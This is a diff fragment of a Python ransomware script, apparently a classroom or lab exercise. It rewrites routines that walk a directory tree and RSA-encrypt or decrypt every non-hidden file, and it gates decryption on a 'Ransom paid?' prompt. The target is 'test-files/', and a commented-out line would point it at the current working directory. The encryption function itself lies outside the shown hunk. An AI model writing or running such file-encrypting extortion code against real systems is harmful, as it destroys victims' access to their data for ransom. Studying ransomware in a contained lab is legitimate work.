@@ -214,43 +214,34 @@ def makeFile(m, filepath, ext):
     
 
 def encrypt_all_files(root):
-    files = getPaths(root)
-
-    for f in files:
-        MyRSAFileEncrypt(f)
+    for rt, dirs, files in os.walk(root):   # root, directories, files
+        for f in files:
+            if f[0] != '.':  # not looking at hidden files
+                MyRSAFileEncrypt(os.path.join(rt, f))
+    print('Files Encrypted')
 
 
 def decrypt_all_files(root):
-    files = getPaths(root)
-    
-    for f in files:
-        MyRSAFileDecrypt(f)
-
-
-def getPaths(root):
-    paths = []
     for rt, dirs, files in os.walk(root):   # root, directories, files
         for f in files:
-            if f[0] != '.':  # not looking at hidden files (doesn't work)
-                paths.append(os.path.join(rt, f))
-
-    return paths
+            if f[0] != '.':  # not looking at hidden files
+                MyRSAFileDecrypt(os.path.join(rt, f))
+    print('Files Decrypted')
 
 
 def main():
     root = 'test-files/'
-    # root = os.getcwD()
+    # root = os.getcwd()
     
     enc = input('Encrypt? (y/n): ')
     if enc == 'y':
         encrypt_all_files(root)
-        print('Files Encrypted')
     
     paid = input('Ransom paid? (y/n): ')
     # paid = 'y'
     if paid == 'y':
         decrypt_all_files(root)
-        print('Files Decrypted')
+
 
 
 main()
